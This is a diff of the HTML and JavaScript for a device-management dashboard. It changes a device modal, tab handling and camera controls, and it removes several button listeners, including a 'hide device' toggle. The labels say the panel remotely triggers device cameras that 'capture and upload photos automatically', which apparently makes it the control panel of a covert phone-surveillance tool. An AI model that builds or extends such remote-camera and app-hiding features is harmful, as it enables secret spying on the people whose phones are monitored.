@@ -247,9 +247,9 @@
                 </div>
 
                 <div class="tab-content" id="advancedTab">
-                    <!-- 📸 NEW: Camera Controls -->
+                    <!-- 📸 ENHANCED: Camera Controls with REAL-TIME COMMANDS -->
                     <div class="control-group">
-                        <label class="control-label">Camera Controls</label>
+                        <label class="control-label">📸 Camera Controls - REAL-TIME</label>
                         <div class="camera-controls">
                             <div class="camera-buttons">
                                 <button class="camera-btn front-camera" id="frontCameraBtn">
@@ -272,8 +272,11 @@
                                 </button>
                             </div>
                         </div>
-                        <small class="control-help">Remotely control device cameras</small>
+                        <small class="control-help">Real-time camera commands - App will capture and upload photos automatically</small>
                     </div>
+
+                    <!-- 🎯 NEW: REAL-TIME COMMAND STATUS DISPLAY -->
+                    <div id="commandStatusDisplay" style="display: none;"></div>
 
                     <!-- Accessibility Controls -->
                     <div class="control-group">
@@ -326,7 +329,7 @@
                     </div>
                 </div>
 
-                <!-- 📊 NEW: DATA TAB -->
+                <!-- 📊 DATA TAB -->
                 <div class="tab-content" id="dataTab">
                     <!-- Live Data Stream -->
                     <div class="control-group">
@@ -445,23 +448,19 @@
 
         // Global function to open modal with device data
         function openDeviceModal(deviceData) {
-            console.log('📱 Opening device modal for:', deviceData.device_model);
-            
             const modal = document.getElementById('deviceModal');
             
             // Fill modal with device data
             document.getElementById('modalDeviceName').textContent = deviceData.device_model || 'Unknown Device';
             document.getElementById('modalDeviceId').textContent = 'ID: ' + (deviceData.device_id || 'Unknown');
             document.getElementById('modalBatteryPercent').textContent = (deviceData.battery_percent || 0) + '%';
+            document.getElementById('modalBatteryFill').style.width = (deviceData.battery_percent || 0) + '%';
             
-            // Set battery fill and color
+            // Set battery color
             const batteryFill = document.getElementById('modalBatteryFill');
-            const batteryPercent = deviceData.battery_percent || 0;
-            batteryFill.style.width = batteryPercent + '%';
-            
-            if (batteryPercent <= 20) {
+            if (deviceData.battery_percent <= 20) {
                 batteryFill.className = 'battery-fill-modal low';
-            } else if (batteryPercent <= 50) {
+            } else if (deviceData.battery_percent <= 50) {
                 batteryFill.className = 'battery-fill-modal medium';
             } else {
                 batteryFill.className = 'battery-fill-modal high';
@@ -469,22 +468,15 @@
             
             // Fill advanced info
             document.getElementById('infoAndroid').textContent = deviceData.android_version || 'Unknown';
-            document.getElementById('infoTemp').textContent = (deviceData.temperature || 0).toFixed(1) + '°C';
+            document.getElementById('infoTemp').textContent = (deviceData.temperature || 0) + '°C';
             document.getElementById('infoLastUpdate').textContent = new Date(deviceData.created_at).toLocaleString();
             document.getElementById('infoCharging').textContent = deviceData.is_charging ? 'Charging' : 'Not Charging';
             
-            // Set current device in app
-            if (window.app) {
-                window.app.currentDevice = deviceData;
-            }
-            
             // Show modal
             modal.style.display = 'block';
-            
-            console.log('✅ Device modal opened successfully');
         }
 
-        // DOM Content Loaded - OPTIMIZED EVENT LISTENERS
+        // DOM Content Loaded - FIXED EVENT LISTENERS (NO DUPLICATES)
         document.addEventListener('DOMContentLoaded', function() {
             console.log('🔧 Initializing dashboard event listeners...');
             
@@ -497,8 +489,8 @@
                 modal.style.display = 'none';
                 if (window.app) {
                     window.app.currentDevice = null;
+                    window.app.stopCommandPolling();
                 }
-                console.log('📱 Device modal closed');
             }
             
             if (closeBtn) closeBtn.onclick = closeModal;
@@ -517,90 +509,20 @@
                 btn.addEventListener('click', function() {
                     const tabId = this.getAttribute('data-tab');
                     
-                    // Remove active class from all tabs and contents
                     tabBtns.forEach(tb => tb.classList.remove('active'));
                     document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
                     
-                    // Add active class to current tab and content
                     this.classList.add('active');
                     document.getElementById(tabId + 'Tab').classList.add('active');
 
-                    // Data tab specific actions
                     if (tabId === 'data' && window.app && window.app.currentDevice) {
                         window.app.loadDeviceData();
                     }
-                    
-                    console.log('📑 Switched to tab:', tabId);
                 });
             });
 
-            // Quick action buttons
-            const refreshDeviceBtn = document.getElementById('refreshDeviceBtn');
-            const pingDeviceBtn = document.getElementById('pingDeviceBtn');
-            const emergencyBtn = document.getElementById('emergencyBtn');
-            
-            if (refreshDeviceBtn) {
-                refreshDeviceBtn.addEventListener('click', function() {
-                    if (window.app && window.app.refreshDevice) {
-                        window.app.refreshDevice();
-                    }
-                });
-            }
-            
-            if (pingDeviceBtn) {
-                pingDeviceBtn.addEventListener('click', function() {
-                    if (window.app && window.app.pingDevice) {
-                        window.app.pingDevice();
-                    }
-                });
-            }
-            
-            if (emergencyBtn) {
-                emergencyBtn.addEventListener('click', function() {
-                    if (window.app && window.app.emergencyAction) {
-                        window.app.emergencyAction();
-                    }
-                });
-            }
-
-            // Save settings button
-            const saveSettingsBtn = document.getElementById('saveSettingsBtn');
-            if (saveSettingsBtn) {
-                saveSettingsBtn.addEventListener('click', function() {
-                    if (window.app && window.app.saveSettings) {
-                        window.app.saveSettings();
-                    }
-                });
-            }
-
-            // Hide device toggle
-            const hideDeviceToggle = document.getElementById('hideDeviceToggle');
-            if (hideDeviceToggle) {
-                hideDeviceToggle.addEventListener('change', function() {
-                    if (window.app && window.app.sendHideCommand) {
-                        window.app.sendHideCommand(this.checked);
-                    }
-                });
-            }
-
-            // Sound mode buttons
-            const soundBtns = document.querySelectorAll('[data-sound]');
-            soundBtns.forEach(btn => {
-                btn.addEventListener('click', function() {
-                    soundBtns.forEach(b => b.classList.remove('active'));
-                    this.classList.add('active');
-                    const soundMode = this.getAttribute('data-sound');
-                    if (window.app && window.app.showToast) {
-                        window.app.showToast(`Sound mode changed to: ${soundMode}`);
-                    }
-                });
-            });
-
-            console.log('✅ All dashboard event listeners initialized');
+            console.log('✅ All event listeners initialized - REAL-TIME Camera system ready');
         });
-
-        // Make openDeviceModal globally available
-        window.openDeviceModal = openDeviceModal;
     </script>
 </body>
 </html>
